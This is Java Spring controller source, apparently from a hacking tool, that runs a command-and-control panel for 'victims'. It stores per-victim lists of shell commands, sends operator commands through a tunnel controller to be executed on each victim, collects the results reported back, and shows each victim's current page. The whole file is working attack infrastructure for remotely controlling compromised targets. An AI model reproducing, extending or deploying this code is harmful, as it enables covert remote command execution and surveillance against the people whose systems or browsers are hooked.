package nl.byron.hacking.controller;

import nl.byron.hacking.model.ShellCommand;
import nl.byron.hacking.model.TunnelCommand;
import nl.byron.hacking.model.Victim;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Byron Voorbach
 */
@Controller
public class ShellController {

    private Map<String, ArrayList<ShellCommand>> victimCommands;

    @Autowired
    private TunnelController tunnelController;

    public ShellController() {
        victimCommands = new HashMap<String, ArrayList<ShellCommand>>();
    }

    @RequestMapping(value = "/shell/{id}", method = RequestMethod.GET)
    public String showShell(@PathVariable String id, Model model) {
        ArrayList<ShellCommand> commands = victimCommands.get(id);

        if(commands == null) {
            commands = new ArrayList<ShellCommand>();
            victimCommands.put(id, commands);
        }

        if (!commands.isEmpty()) {
            model.addAttribute("commands", commands);
        }

        Victim victim = tunnelController.getVictim(id);
        model.addAttribute("victim", victim);

        return "shell";
    }

    @RequestMapping(value = "/shellCommands/{id}")
    public String getShellCommnds(@PathVariable String id, Model model) {
        model.addAttribute("commands", victimCommands.get(id));
        return "shellCommands";
    }

    @RequestMapping(value = "/currentPage/{id}")
    @ResponseBody
    public String getCurrentPage(@PathVariable String id) {
        return tunnelController.getVictim(id).getCurrentPage();
    }


    /**
     * !Improve error handling!
     * @param command the command to process
     * @param id id of the victim
     */
    @RequestMapping(value = "/receiveShellCommand/{id}", method = RequestMethod.POST)
    @ResponseBody
    public void receiveShellCommand(@RequestBody ShellCommand command, @PathVariable String id) {
        ArrayList<ShellCommand> commands = victimCommands.get(id);
        commands.add(command);

        TunnelCommand tunnelCommand = new TunnelCommand(command.getId(), command.getType(), command.getMetaData());
        tunnelController.addCommandToBeProcessed(id ,tunnelCommand);
    }

    @RequestMapping(value = "/clear/{id}")
    @ResponseBody
    public void clearCommands(@PathVariable String id) {
        ArrayList<ShellCommand> commands = victimCommands.get(id);
        commands.clear();
    }

    public void reportBack(ShellCommand shellCommand) {
        ArrayList<ShellCommand> commands = victimCommands.get(shellCommand.getId());
        commands.add(shellCommand);
    }


    public Map<String, ArrayList<ShellCommand>> getVictimCommands() {
        return victimCommands;
    }

    public void setVictimCommands(Map<String, ArrayList<ShellCommand>> victimCommands) {
        this.victimCommands = victimCommands;
    }
}
